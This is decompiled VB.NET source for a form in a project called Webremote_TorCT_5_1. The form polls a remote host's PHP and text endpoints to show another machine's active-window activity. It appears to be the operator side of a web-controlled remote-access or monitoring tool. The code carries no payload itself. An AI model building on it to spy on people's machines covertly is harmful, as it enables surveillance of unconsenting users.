Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class getactivewindow
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.getactivewindow_FormClosing)
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.getactivewindow_Load)
            Dim list As List(Of WeakReference) = getactivewindow.__ENCList
            SyncLock list
                getactivewindow.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.sendcommand = New WebClient
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub getactivewindow_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
            Me.Timer1.Stop
            Me.sendcommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/AddFNActive.php?Proces=."))
        End Sub

        Private Sub getactivewindow_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.Timer1.Start
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(getactivewindow))
            Me.Timer1 = New Timer(Me.components)
            Me.TextBox1 = New TextBox
            Me.SuspendLayout
            Me.Timer1.Enabled = True
            Me.Timer1.Interval = &H1388
            Me.TextBox1.Dock = DockStyle.Fill
            Dim point As New Point(0, 0)
            Me.TextBox1.Location = point
            Me.TextBox1.Multiline = True
            Me.TextBox1.Name = "TextBox1"
            Me.TextBox1.ScrollBars = ScrollBars.Vertical
            Dim size As New Size(&H11C, &H1DE)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 11
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H11C, &H1DE)
            Me.ClientSize = size
            Me.Controls.Add(Me.TextBox1)
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "getactivewindow"
            Me.Text = "getactivewindow"
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
            If Not ((Me.TextBox1.Text = Me.sendcommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/FnActiveWindow.txt"))) Or (Me.sendcommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/FnActiveWindow.txt")) = ".")) Then
                Me.TextBox1.Text = Me.sendcommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/FnActiveWindow.txt"))
            End If
        End Sub


        ' Properties
        Friend Overridable Property TextBox1 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Timer1 As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._Timer1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
                If (Not Me._Timer1 Is Nothing) Then
                    RemoveHandler Me._Timer1.Tick, handler
                End If
                Me._Timer1 = WithEventsValue
                If (Not Me._Timer1 Is Nothing) Then
                    AddHandler Me._Timer1.Tick, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("Timer1")> _
        Private _Timer1 As Timer
        Private components As IContainer
        Private sendcommand As WebClient
    End Class
End Namespace

